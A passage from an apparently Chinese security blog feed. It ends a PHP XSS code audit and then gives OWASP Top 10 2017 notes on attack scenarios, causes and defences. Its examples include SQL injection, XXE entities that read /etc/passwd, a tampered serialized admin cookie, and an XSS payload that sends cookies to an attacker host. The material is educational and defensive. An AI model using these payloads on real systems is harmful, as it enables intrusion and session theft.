class="variable">$_POST</span>[ <span class="string">'txtName'</span> ] ); </span><br><span class="line">    // Sanitize message input </span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> ); </span><br><span class="line">    // Sanitize name input </span><br><span class="line">    <span class="variable">$name</span> = stripslashes( <span class="variable">$name</span> ); </span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> ); </span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$name</span> ); </span><br><span class="line">    // Update database </span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> ); </span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">':message'</span>, <span class="variable">$message</span>, PDO::PARAM_STR ); </span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">':name'</span>, <span class="variable">$name</span>, PDO::PARAM_STR ); </span><br><span class="line">    <span class="variable">$data</span>-&gt;execute(); </span><br><span class="line">&#125; </span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-28"><a href="#审计-28" class="headerlink" title="审计"></a>审计</h4><p>通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS</p></script></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>OWASPTop2017笔记</title>
      <link href="/2018/01/31/OWASPTop2017%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/01/31/OWASPTop2017%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>可能第一次接触web安全的同学，都不知道标题是什么意思，现在先扫盲一下<br><a id="more"></a></p><h2 id="关于OWASP"><a href="#关于OWASP" class="headerlink" title="关于OWASP"></a>关于OWASP</h2><blockquote><p>OWASP，全称是：Open Web Application Security Project，翻译为中文就是：开放式Web应用程序安全项目，是一个非营利组织，不附属于任何企业或财团，这也是该组织可以不受商业控制地进行安全开发及安全普及的重要原因。</p></blockquote><h2 id="关于OWASP-TOP-10"><a href="#关于OWASP-TOP-10" class="headerlink" title="关于OWASP TOP 10"></a>关于OWASP TOP 10</h2><blockquote><p>这是每年的一份关于web应用的十大威胁安全报告，会在经过安全专家的测验之后确定十大类对当前web应用威胁最大和被应用最广的漏洞，同时也会对其进行详细的分析威胁所在。 </p></blockquote><h2 id="历史版本"><a href="#历史版本" class="headerlink" title="历史版本"></a>历史版本</h2><h3 id="OWASP-Top-10-2010"><a href="#OWASP-Top-10-2010" class="headerlink" title="OWASP Top 10 - 2010"></a>OWASP Top 10 - 2010</h3><blockquote><p>A1—注入<br> A2—跨站脚本、XSS<br> A3—失效的身份认证会话管理<br> A4—不安全的直接对象引用<br> A5—跨站请求伪造(CSRF)<br> A6—安全配置错误<br> A7—不安全的加密存储<br> A8—没有限制的URL访问<br> A9—传输层保护不足<br> A10—未验证的重定向和转发</p></blockquote><h3 id="OWASP-Top-10-2013"><a href="#OWASP-Top-10-2013" class="headerlink" title="OWASP Top 10 - 2013"></a>OWASP Top 10 - 2013</h3><blockquote><p>A1—注入<br> A2—失效的身份认证会话管理<br> A3—跨站脚本、XSS<br> A4—不安全的直接对象引用<br> A5—安全配置错误<br> A6—敏感信息泄漏<br> A7—功能级访问控制缺失<br> A8—跨站请求伪造(CSRF)<br> A9—使用含有已知漏洞的组件<br> A10—未验证的重定向和转发  </p></blockquote><h3 id="OWASP-Top-10-2017"><a href="#OWASP-Top-10-2017" class="headerlink" title="OWASP Top 10 - 2017"></a>OWASP Top 10 - 2017</h3><blockquote><p>A1—注入<br> A2—失效的身份认证会话管理<br> A3—敏感信息泄露<br> A4—XML外部实体<br> A5—失效的访问控制<br> A6—安全配置错误<br> A7—跨站脚本（XSS）<br> A8—不安全的反序列化<br> A9—使用含有已知漏洞的组件<br> A10—不足的日志记录和监控         </p></blockquote><h1 id="OWASP-Top-10-2017-1"><a href="#OWASP-Top-10-2017-1" class="headerlink" title="OWASP Top 10 - 2017"></a>OWASP Top 10 - 2017</h1><h2 id="1注入"><a href="#1注入" class="headerlink" title="1注入"></a>1注入</h2><h3 id="攻击案例场景"><a href="#攻击案例场景" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><h4 id="场景-1"><a href="#场景-1" class="headerlink" title="场景#1"></a>场景#1</h4><p>应用程序在下面存在脆弱性的SQL语句的构造中使用不可信数据：<br>String query = “SELECT * FROM accounts WHERE<br>custID=’” + request.getParameter(“id”) + “‘“;</p><h4 id="场景-2"><a href="#场景-2" class="headerlink" title="场景#2"></a>场景#2</h4><p>同样的，框架应用的盲目信任，仍然可能导致查询语句<br>的漏洞。（例如：Hibernate查询语言（HQL））：<br>Query HQLQuery = session.createQuery(“FROM accounts<br>WHERE custID=’” + request.getParameter(“id”) + “‘“);<br>在这两个案例中，攻击者在浏览器中将“id”参数的值修改成： ’<br>or’1’=’1。例如：<a href="http://example.com/app/accountView?id=&#39;" target="_blank" rel="noopener">http://example.com/app/accountView?id=&#39;</a> or ‘1’=’1<br>这样查询语句的意义就变成了从accounts表中返回所有的记录。<br>更危险的攻击可能导致数据被篡改甚至是存储过程被调用。</p><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><ul><li>用户提供的数据没有经过应用程序的验证、过滤或净化。</li><li>动态查询语句或非参数化的调用，在没有上下文感知转义的情况<br>下，被用于解释器。</li><li>在ORM搜索参数中使用了恶意数据，这样搜索就获得包含敏感<br>或未授权的数据。</li><li>恶意数据直接被使用或连接，诸如SQL语句或命令在动态查询语<br>句、命令或存储过程中包含结构和恶意数据。</li></ul><h3 id="防止"><a href="#防止" class="headerlink" title="防止"></a>防止</h3><ul><li>最佳选择是使用安全的API，完全避免使用解释器，或提供参数<br>化界面的接口，或迁移到ORM或实体框架。</li><li>注意：当参数化时，存储过程仍然可以引入SQL注入，如果<br>PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即<br>执行或exec()的恶意数据。</li><li>使用正确的或“白名单”的具有恰当规范化的输入验证方法同样<br>会有助于防止注入攻击，但这不是一个完整的防御，因为许多应<br>用程序在输入中需要特殊字符，例如文本区域或移动应用程序的<br>API。</li><li>对于任何剩余的动态查询，可以使用该解释器的特定转义语法转<br>义特殊字符。OWASP的Java Encoder和类似的库提供了这样的<br>转义例程。</li><li>注意：SQL结构，比如：表名、列名等无法转义，因此用户提供<br>的结构名是非常危险的。这是编写软件中的一个常见问题。</li><li>在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量<br>地泄露记录。</li></ul><h2 id="2失效的身份认证"><a href="#2失效的身份认证" class="headerlink" title="2失效的身份认证"></a>2失效的身份认证</h2><h3 id="攻击案例场景-1"><a href="#攻击案例场景-1" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><h4 id="场景-1-1"><a href="#场景-1-1" class="headerlink" title="场景#1"></a>场景#1</h4><p>凭证填充，使用已知密码的列表，是常见的攻击。如果<br>应用程序不限制身份验证尝试，则可以将应用程序用作密码oracle，<br>以确定凭证是否有效。</p><h4 id="场景-2-1"><a href="#场景-2-1" class="headerlink" title="场景#2"></a>场景#2</h4><p>大多数身份验证攻击都是由于使用密码作为唯一的因素。<br>依据最佳实践，最新的密码轮换和复杂性要求鼓励用户使用、重<br>用以及重用弱密码。建议组织在NIST-800-63中停止这些实践，并<br>使用多因素身份验证。</p><h4 id="场景-3"><a href="#场景-3" class="headerlink" title="场景#3"></a>场景#3</h4><p>应用会话超时设置不正确。用户使用公共计算机访问应<br>用程序。用户直接关闭浏览器选项卡就离开，而不是选择“注<br>销”。攻击者一小时后使用同一个浏览器浏览网页，而当前用户<br>状态仍然是经过身份验证的。</p><h3 id="产生原因-1"><a href="#产生原因-1" class="headerlink" title="产生原因"></a>产生原因</h3><ul><li>允许凭证填充，这使得攻击者获得有效用户名和密码的列表。</li><li>允许暴力破解或其他自动攻击。</li><li>允许默认的、弱的或众所周知的密码，例如“Password1”或<br>“admin/admin”。</li><li>使用弱的或失效的验证凭证，忘记密码程序，例如“基于知识的<br>答案”，这是不安全的。</li><li>使用明文、加密或弱散列密码（参见：A3:2017-敏感数据泄露）。</li><li>缺少或失效的多因素身份验证。</li><li>暴露URL中的会话ID（例如URL重写）。</li><li>在成功登录后不会更新会话ID。</li><li>不正确地使会话ID失效。当用户不活跃的时候，用户会话或认证<br>令牌（特别是单点登录（SSO）令牌）没有正确注销或失效。</li></ul><h3 id="防止-1"><a href="#防止-1" class="headerlink" title="防止"></a>防止</h3><ul><li>在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、<br>暴力破解和被盗凭据再利用攻击。</li><li>不要使用发送或部署默认的凭证，特别是管理员用户。</li><li>执行弱密码检查，例如测试新或变更的密码，以纠正“排名前<br>10000个弱密码” 列表。</li><li>将密码长度、复杂性和循环策略与NIST-800-63 B的指导方针的<br>5.1.1章节-记住秘密，或其他现代的基于证据的密码策略相一致。</li><li>确认注册、凭据恢复和API路径，通过对所有输出结果使用相同<br>的消息，用以抵御账户枚举攻击。</li><li>限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填<br>充、暴力破解或其他攻击被检测时提醒管理员。</li><li>使用服务器端安全的内置会话管理器，在登录后生成高度复杂的<br>新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、<br>闲置、绝对超时后使其失效</li></ul><h2 id="3敏感信息泄露"><a href="#3敏感信息泄露" class="headerlink" title="3敏感信息泄露"></a>3敏感信息泄露</h2><h3 id="攻击案例场景-2"><a href="#攻击案例场景-2" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><h4 id="场景-1-2"><a href="#场景-1-2" class="headerlink" title="场景 #1"></a>场景 #1</h4><p>一个应用程序使用自动化的数据加密系统加密信用卡信<br>息，并存储在数据库中。但是，当数据被检索时被自动解密，这<br>就使得SQL注入漏洞能够以明文形式获得所有信用卡卡号。</p><h4 id="场景-2-2"><a href="#场景-2-2" class="headerlink" title="场景 #2"></a>场景 #2</h4><p>一个网站上对所有网页没有使用或强制使用TLS，或者使<br>用弱加密。攻击者通过监测网络流量（如：不安全的无线网络），<br>将网络连接从HTTPS降级到HTTP，就可以截取请求并窃取用户会话<br>cookie。 之后，攻击者可以复制用户cookie并成功劫持经过认证<br>的用户会话、访问或修改用户个人信息。除此之外，攻击者还可<br>以更改所有传输过程中的数据，例如：转款的接接收者。</p><h4 id="场景-3-1"><a href="#场景-3-1" class="headerlink" title="场景 #3"></a>场景 #3</h4><p>密码数据库使用未加盐的哈希算法或弱哈希算法去存储<br>每个人的密码。一个文件上传漏洞使黑客能够获取密码文件。所<br>有这些未加盐哈希的密码通过彩虹表暴力破解方式破解。 由简单<br>或快速散列函数生成加盐的哈希，也可以通过GPU破解。</p><h3 id="产生原因-2"><a href="#产生原因-2" class="headerlink" title="产生原因"></a>产生原因</h3><ul><li>在数据传输过程中是否使用明文传输？这和传输协议相关，如：<br>HTTP、SMTP和FTP。外部网络流量非常危险。验证所有的内部通<br>信，如：负载平衡器、Web服务器或后端系统之间的通信。</li><li>当数据被长期存储时，无论存储在哪里，它们是否都被加密，包<br>含备份数据？</li><li>无论默认条件还是源代码中，是否还在使用任何旧的或脆弱的加<br>密算法？</li><li>是否使用默认加密密钥，生成或重复使用脆弱的加密密钥，或者<br>缺少恰当的密钥管理或密钥回转？</li><li>是否强制加密敏感数据，例如：用户代理（如：浏览器）指令和<br>传输协议是否被加密？</li><li>用户代理（如：应用程序、邮件客户端）是否未验证服务器端证<br>书的有效性？</li></ul><h3 id="防止-2"><a href="#防止-2" class="headerlink" title="防止"></a>防止</h3><ul><li>对系统处理、存储或传输的数据分类，并根据分类进行访问控制。</li><li>熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保<br>护敏感数据。</li><li>对于没必要存放的、重要的敏感数据，应当尽快清除，或者通过<br>PCI DSS标记或拦截。未存储的数据不能被窃取。</li><li>确保存储的所有敏感数据被加密。</li><li>确保使用了最新的、强大的标准算法或密码、参数、协议和密匙，<br>并且密钥管理到位。</li><li>确保传输过程中的数据被加密，如：使用TLC。确保数据加密被<br>强制执行，如：使用HTTP严格安全传输协议（HSTS ）。</li><li>禁止缓存对包含敏感数据的响应。</li><li>确保使用密码专用算法存储密码，如：Argon2 、 scrypt 、<br>bcrypt 或者PBKDF2 。将工作因素（延迟因素）设置在可接受<br>范围。</li><li>单独验证每个安全配置项的有效性。</li></ul><h2 id="4XML-外部实体（XXE）"><a href="#4XML-外部实体（XXE）" class="headerlink" title="4XML 外部实体（XXE）"></a>4XML 外部实体（XXE）</h2><h3 id="攻击案例场景-3"><a href="#攻击案例场景-3" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><ul><li>场景 #1<br>攻击者尝试从服务端提取数据：<br>&lt;?xml version=”1.0” encoding=”ISO-8859-1”?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM “file:///etc/passwd” &gt;]&gt;<foo>&xxe;</foo></li><li>场景 #2<br>攻击者通过将上面的实体行更改为以下内容来探测服务<br>器的专用网络：<br>&lt;!ENTITY xxe SYSTEM “<a href="https://192.168.1.1/private&quot;" target="_blank" rel="noopener">https://192.168.1.1/private&quot;</a> &gt;]&gt;</li><li>场景 #3<br>攻击者通过恶意文件执行拒绝服务攻击：<br>&lt;!ENTITY xxe SYSTEM “file:///dev/random” &gt;]&gt;<h3 id="产生原因-3"><a href="#产生原因-3" class="headerlink" title="产生原因"></a>产生原因</h3></li><li>您的应用程序直接接受XML文件或者接受XML文件上传，特别是<br>来自不受信任源的文件，或者将不受信任的数据插入XML文件，<br>并提交给XML处理器解析。</li><li>在应用程序或基于Web服务的SOAP中，所有XML处理器都启用<br>了文档类型定义（DTDs）。因为禁用DTD进程的确切机制因处<br>理器而不同，更多资料请参考：《OWASP Cheat Sheet ‘XXE<br>Prevention‘ 》。</li><li>如果为了实现安全性或单点登录（SSO），您的应用程序使用<br>SAML进行身份认证。而SAML使用XML进行身份确认，那么您<br>的应用程序就容易受到XXE攻击。</li><li>如果您的应用程序使用第1.2版之前的SOAP，并将XML实体传<br>递到SOAP框架，那么它可能受到XXE攻击。</li><li>存在XXE缺陷的应用程序更容易受到拒绝服务攻击，包括：<br>Billion Laughs 攻击</li></ul><h3 id="防止-3"><a href="#防止-3" class="headerlink" title="防止"></a>防止</h3><ul><li>尽可能使用简单的数据格式（如：JSON），避免对敏感数据进<br>行序列化。</li><li>及时修复或更新应用程序或底层操作系统使用的所有XML处理器<br>和库。同时，通过依赖项检测，将SOAP更新到1.2版本或更高<br>版本。</li><li>参考《 OWASP Cheat Sheet ‘XXE Prevention‘ 》，在应用程序<br>的所有XML解析器中禁用XML外部实体和DTD进程。</li><li>在服务器端实施积极的（“白名单”）输入验证、过滤和清理，<br>以防止在XML文档、标题或节点中出现恶意数据。</li><li>验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证<br>方法来验证上传的XML文件。</li><li>尽管在许多集成环境中，手动代码审查是大型、复杂应用程序的<br>最佳选择，但是SAST 工具可以检测源代码中的XXE漏洞</li></ul><h2 id="5失效的访问控制"><a href="#5失效的访问控制" class="headerlink" title="5失效的访问控制"></a>5失效的访问控制</h2><h3 id="攻击案例场景-4"><a href="#攻击案例场景-4" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><ul><li>场景 #1<br>应用程序在访问帐户信息的 SQL调用中使用了未经验证<br>的数据：<br>pstmt.setString(1，request.getParameter(“acct”));<br>ResultSet results = pstmt.executeQuery( );<br>攻击者只需修改浏览器中的“acct”参数即可发送他们想要的任何<br>帐号信息。如果没有正确验证，攻击者可以访问任何用户的帐户。<br><a href="http://example.com/app/accountInfo?acct=notmyacct" target="_blank" rel="noopener">http://example.com/app/accountInfo?acct=notmyacct</a></li><li>场景 #2<br>攻击者仅强制浏览目标URL。管理员权限是访问管理页<br>面所必需的。<br><a href="http://example.com/app/getappInfo" target="_blank" rel="noopener">http://example.com/app/getappInfo</a><br><a href="http://example.com/app/admin_getappInfo" target="_blank" rel="noopener">http://example.com/app/admin_getappInfo</a><br>如果一个未经身份验证的用户可以访问任何页面，那么这是一个<br>缺陷。如果一个非管理员权限的用户可以访问管理页面，那么这<br>同样也是一个缺陷。</li></ul><h3 id="产生原因-4"><a href="#产生原因-4" class="headerlink" title="产生原因"></a>产生原因</h3><ul><li>通过修改 URL、内部应用程序状态或 HTML 页面绕过访问控制<br>检查，或简单地使用自定义的 API 攻击工具。</li><li>允许将主键更改为其他用户的记录，例如查看或编辑他人的帐户。</li><li>特权提升。在不登录的情况下假扮用户，或以用户身份登录时充<br>当管理员。</li><li>元数据操作，如重放或篡改 JWT 访问控制令牌，或作以提升权<br>限的cookie 或隐藏字段。</li><li>CORS配置错误允许未授权的API访问。</li><li>以未通过身份验证的用户身份强制浏览的通过身份验证时才能看<br>到的页面、或作为标准用户访问具有相关权限的页面、或API没<br>有对POST、PUT和DELETE强制执行访问控制。<h3 id="防止-4"><a href="#防止-4" class="headerlink" title="防止"></a>防止</h3></li><li>除公有资源外，默认情况下拒绝访问。</li><li>使用一次性的访问控制机制，并在整个应用程序中不断重用它们，<br>包括最小化CORS使用。</li><li>建立访问控制模型以强制执行所有权记录，而不是接受用户创建、<br>读取、更新或删除的任何记录。</li><li>域访问控制对每个应用程序都是唯一的，但业务限制要求应由域<br>模型强制执行。</li><li>禁用 Web服务器目录列表，并确保文件元数据（如：git）不存<br>在于 Web的根目录中。</li><li>记录失败的访问控制，并在适当时向管理员告警（如：重复故<br>障）。</li><li>对API和控制器的访问进行速率限制，以最大限度地降低自动化<br>攻击工具的危害。</li><li>当用户注销后，服务器上的JWT令牌应失效</li></ul><h2 id="6安全配置错误"><a href="#6安全配置错误" class="headerlink" title="6安全配置错误"></a>6安全配置错误</h2><h3 id="攻击案例场景-5"><a href="#攻击案例场景-5" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><ul><li>场景#1：<br>应用程序服务器附带了未从产品服务器中删除的应用程<br>序样例。这些样例应用程序具有已知的安全漏洞，攻击者利用这<br>些漏洞来攻击服务器。如果其中一个应用程序是管理员控制台，<br>并且没有更改默认账户，攻击者就可以通过默认密码登录，从而<br>接管服务器。</li><li>场景#2：<br>目录列表在服务器端未被禁用。攻击者发现他们很容易<br>就能列出目录列表。攻击者找到并下载所有已编译的Java类，他<br>们通过反编译来查看代码。然后，攻击者在应用程序中找到一个<br>严重的访问控制漏洞。</li><li>场景#3：<br>应用服务器配置允许将详细的错误信（如：堆栈跟踪信<br>息）返回给用户，这可能会暴露敏感信息或潜在的漏洞，如：已<br>知含有漏洞的组件的版本信息。</li><li>场景#4：<br>云服务向其他CSP用户提供默认的网络共享权限。这允<br>许攻击者访问存储在云端的敏感数据。<h3 id="产生原因-5"><a href="#产生原因-5" class="headerlink" title="产生原因"></a>产生原因</h3></li><li>应用程序栈堆的任何部分都缺少适当的安全加固，或者云服务的<br>权限配置错误。</li><li>应用程序启用或安装了不必要的功能（例如：不必要的端口、服<br>务、网页、帐户或权限）。</li><li>默认帐户的密码仍然可用且没有更改。</li><li>错误处理机制向用户披露堆栈跟踪或其他大量错误信息。</li><li>对于更新的系统，禁用或不安全地配置最新的安全功能。</li><li>应用程序服务器、应用程序框架（如：Struts、Spring、<br>ASP.NET）、库文件、数据库等没有进行安全配置。</li><li>服务器不发送安全标头或指令，或者未对服务器进行安全配置。</li><li>您的应用软件已过期或易受攻击（参见A9：2017-使用含有已知<br>漏洞的组件）<h3 id="防止-5"><a href="#防止-5" class="headerlink" title="防止"></a>防止</h3></li><li>一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。<br>开发、质量保证和生产环境都应该进行相同配置，并且，在每个<br>环境中使用不同的密码。这个过程应该是自动化的，以尽量减少<br>安装一个新安全环境的耗费。</li><li>搭建最小化平台，该平台不包含任何不必要的功能、组件、文档<br>和示例。移除或不安装不适用的功能和框架。</li><li>检查和修复安全配置项来适应最新的安全说明、更新和补丁，并<br>将其作为更新管理过程的一部分，（参见A9：2017-使用含有已<br>知漏洞的组件）。在检查过程中，应特别注意云存储权限（如：<br>S3桶权限）。</li><li>一个能在组件和用户间提供有效的分离和安全性的分段应用程<br>序架构，包括：分段、容器化和云安全组。</li><li>向客户端发送安全指令，如：安全标头。</li><li>在所有环境中能够进行正确安全配置和设置的自动化过程。</li></ul><h2 id="7跨站脚本（XSS）"><a href="#7跨站脚本（XSS）" class="headerlink" title="7跨站脚本（XSS）"></a>7跨站脚本（XSS）</h2><h3 id="攻击案例场景-6"><a href="#攻击案例场景-6" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><ul><li>场景#1<br>应用程序在下面HTML代码段的构造中使用未经验证或转<br>义的不可信的数据：<br>(String) page += “&lt;input name=’creditcard’ type=’TEXT‘<br>value=’” + request.getParameter(“CC“) + “‘&gt;”;<br>攻击者在浏览器中修改“CC” 参数为如下值：<br>‘&gt;<script>document.location=<br>‘<a href="http://www.attacker.com/cgi-bin/cookie.cgi">http://www.attacker.com/cgi-bin/cookie.cgi</a>?<br>foo=’+document.cookie</script>‘.<br>这个攻击导致受害者的会话ID被发送到攻击者的网站，使得攻击<br>者能够劫持用户当前会话。<h3 id="产生原因-6"><a href="#产生原因-6" class="headerlink" title="产生原因"></a>产生原因</h3></li><li>反射式XSS：应用程序或API包括未经验证和未经转义的用户输入，<br>作为HTML输出的一部分。一个成功的攻击可以让攻击者在受害者<br>的浏览器中执行任意的HTML和JavaScript。 通常，用户将需要与指<br>向攻击者控制页面的某些恶意链接进行交互，例如恶意漏洞网站，<br>广告或类似内容。</li><li>存储式XSS：你的应用或者API将未净化的用户输入存储下来了，<br>并在后期在其他用户或者管理员的页面展示出来。 存储型XSS一<br>般被认为是高危或严重的风险。</li><li>基于DOM的XSS：会动态的将攻击者可控的内容加入页面的<br>JavaScript框架、单页面程序或API存在这种类型的漏洞。理想的<br>来说，你应该避免将攻击者可控的数据发送给不安全的JavaScript<br>API。<br>典型的XSS攻击可导致盗取session、账户、绕过MFA、DIV替换、<br>对用户浏览器的攻击（例如：恶意软件下载、键盘记录）以及其<br>他用户侧的攻击。<h3 id="防止-6"><a href="#防止-6" class="headerlink" title="防止"></a>防止</h3></li><li>使用设计上就会自动编码来解决XSS问题的框架，如：Ruby 3.0<br>或 React JS。了解每个框架的XSS保护的局限性，并适当地处<br>理未覆盖的用例。</li><li>为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML<br>输出的上下文（包括：主体、属性、JavaScript、CSS或URL）<br>对所有不可信的HTTP请求数据进行恰当的转义 。更多关于数据<br>转义技术的信息见：《OWASP Cheat Sheet ‘XSS Prevention’》<br>。</li><li>在客户端修改浏览器文档时，为了避免DOM XSS攻击，最好的<br>选择是实施上下文敏感数据编码。如果这种情况不能避免，可以<br>采用《OWASP Cheat Sheet ‘DOM based XSS Prevention ‘》<br>描述的类似上下文敏感的转义技术应用于浏览器API。</li><li>使用内容安全策略（CSP）是对抗XSS的深度防御策略。如果<br>不存在可以通过本地文件放置恶意代码的其他漏洞（例如：路径<br>遍历覆盖和允许在网络中传输的易受攻击的库），则该策略是有<br>效的。</li></ul><h2 id="8不安全的反序列化"><a href="#8不安全的反序列化" class="headerlink" title="8不安全的反序列化"></a>8不安全的反序列化</h2><h3 id="攻击案例场景-7"><a href="#攻击案例场景-7" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><ul><li>场景 #1<br>一个React应用程序调用了一组Spring Boot微服务。作<br>为功能性程序员，他们试图确保他们的代码是不可变的。他们提<br>出的解决方法是序列化用户状态，并在每次请求时来回传递。攻<br>击者注意到了“R00”Java对象签名，并使用Java Serial Killer工<br>具在应用服务器上获得远程代码执行。</li><li>场景 #2<br>一个PHP论坛使用PHP对象序列化来保存一个“超<br>级”cookie。该cookie包含了用户的用户ID、角色、密码哈希和其<br>他状态：<br>a:4:{i:0;i:132;i:1;s:7:”Mallory”;i:2;s:4:”user”;<br>i:3;s:32:”b6a8b3bea87fe0e05022f8f3c88bc960”;}<br>攻击者更改序列化对象以授予自己为admin权限：<br>a:4:{i:0;i:1;i:1;s:5:”Alice”;i:2;s:5:”admin”;<br>i:3;s:32:”b6a8b3bea87fe0e05022f8f3c88bc960”;}<h3 id="产生原因-7"><a href="#产生原因-7" class="headerlink" title="产生原因"></a>产生原因</h3></li><li>如果应用中存在可以在反序列化过程中或者之后被改变行为的类，<br>则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。我<br>们将其称为对象和数据结构攻击。</li><li>典型的数据篡改攻击，如访问控制相关的攻击，其中使用了现有<br>的数据结构，但内容发生了变化。<br>在应用程序中，序列化可能被用于:</li><li>远程和进程间通信（RPC / IPC）</li><li>连线协议、Web服务、消息代理</li><li>缓存/持久性</li><li>数据库、缓存服务器、文件系统</li><li>HTTP cookie、HTML表单参数、API身份验证令牌<h3 id="防止-7"><a href="#防止-7" class="headerlink" title="防止"></a>防止</h3></li><li>执行完整性检查，如：任何序列化对象的数字签名，以防止恶<br>意对象创建或数据篡改。</li><li>在创建对象之前强制执行严格的类型约束，因为代码通常被期<br>望成一组可定义的类。绕过这种技术的方法已经被证明，所以<br>完全依赖于它是不可取的。</li><li>如果可能，隔离运行那些在低特权环境中反序列化的代码。</li><li>记录反序列化的例外情况和失败信息，如：传入的类型不是预<br>期的类型，或者反序列处理引发的例外情况。</li><li>限制或监视来自于容器或服务器传入和传出的反序列化网络连<br>接。</li><li>监控反序列化，当用户持续进行反序列化时，对用户进行警告。</li></ul><h2 id="9使用含有已知漏洞的组件"><a href="#9使用含有已知漏洞的组件" class="headerlink" title="9使用含有已知漏洞的组件"></a>9使用含有已知漏洞的组件</h2><h3 id="攻击案例场景-8"><a href="#攻击案例场景-8" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><ul><li>场景 #1<br>很多时候组件都是以与应用相同的权限运行的，这使得<br>组件里的缺陷可能导致各式各样的问题。这些缺陷可能是偶然的<br>（如：编码错误），也可能是蓄意的（如：组件里的后门）。下<br>面是一些已被利用的漏洞：<br>• CVE-2017-5638，一个Struts2远程执行漏洞。 可在服务端远程<br>执行代码，并已造成巨大的影响。<br>• 虽然物联网（IoT）设备一般难以通过打补丁来修复。但对之打<br>补丁非常重要（如：医疗设备）。<h3 id="产生原因-8"><a href="#产生原因-8" class="headerlink" title="产生原因"></a>产生原因</h3></li><li>如果你不知道所有使用的组件版本信息（包括：服务端和客户<br>端）。这包括了直接使用的组件或其依赖的组件。</li><li>如果软件易受攻击，不再支持或者过时。这包括：OS、Web服<br>务器、应用程序服务器、数据库管理系统（DBMS）、应用程序、<br>API和所有的组件、运行环境和库。</li><li>如果你不会定期做漏洞扫描和订阅你使用组件的安全公告。</li><li>如果你不基于风险并及时修复或升级底层平台、框架和依赖库。<br>很可能发生这种情况：根据变更控制，每月或每季度进行升级，<br>这使得组织在这段时间内会受到已修复但未修补的漏洞的威胁。</li><li>如果软件工程师没有对更新的、升级的或打过补丁的组件进行兼<br>容性测试。</li><li>如果你没有对组件进行安全配置（请参考“A6:2017-安全配置错<br>误”）。<h3 id="防止-8"><a href="#防止-8" class="headerlink" title="防止"></a>防止</h3></li><li>移除不使用的依赖、不需要的功能、组件、文件和文档。</li><li>利用如 versions、DependencyCheck 、retire.js等工具来持续的<br>记录客户端和服务器端以及它们的依赖库的版本信息。持续监控<br>如CVE 和 NVD等是否发布已使用组件的漏洞信息，可以使用软<br>件分析工具来自动完成此功能。订阅关于使用组件安全漏洞的警<br>告邮件。</li><li>仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡<br>改或加入恶意漏洞的风险</li><li>监控那些不再维护或者不发布安全补丁的库和组件。如果不能打<br>补丁，可以考虑部署虚拟补丁来监控、检测或保护</li></ul><h2 id="10不足的日志记录和监控"><a href="#10不足的日志记录和监控" class="headerlink" title="10不足的日志记录和监控"></a>10不足的日志记录和监控</h2><h3 id="攻击案例场景-9"><a href="#攻击案例场景-9" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><ul><li>场景#1<br>一个由小团队运营的开源项目论坛软件被攻击者利用其<br>内在漏洞攻陷了。 攻击者设法删除了包含下一个版本的内部源代<br>码仓库以及所有论坛内容。 虽然代码可以恢复，但由于缺乏监控、<br>日志记录和告警导致了更糟糕的结果。 由于此问题，该论坛软件<br>项目不再活跃。</li><li>场景#2<br>攻击者使用通用密码进行用户扫描并能获取所有使用此<br>密码的账户。对于其他账户而言，将仅有一次失败的登陆尝试记<br>录。一段时间以后，攻击者可以用另一个密码再次进行此活动。</li><li>场景#3<br>美国的一家大型零售商据内部使用恶意软件分析沙箱做<br>分析。 沙箱软件检测到了一些可能不需要的软件，但没有人响应<br>此次检测。 在一个境外银行不正当的信用卡交易被检测到之前，<br>该沙箱软件一直在产生告警信息<h3 id="产生原因-9"><a href="#产生原因-9" class="headerlink" title="产生原因"></a>产生原因</h3></li><li>未记录可审计性事件，如：登录、登录失败和高额交易。</li><li>告警和错误事件未能产生或产生不足的和不清晰的日志信息。</li><li>没有利用应用系统和API的日志信息来监控可疑活动。</li><li>日志信息仅在本地存储。</li><li>没有定义合理的告警阈值和制定响应处理流程。</li><li>渗透测试和使用DAST工具（如：OWASP 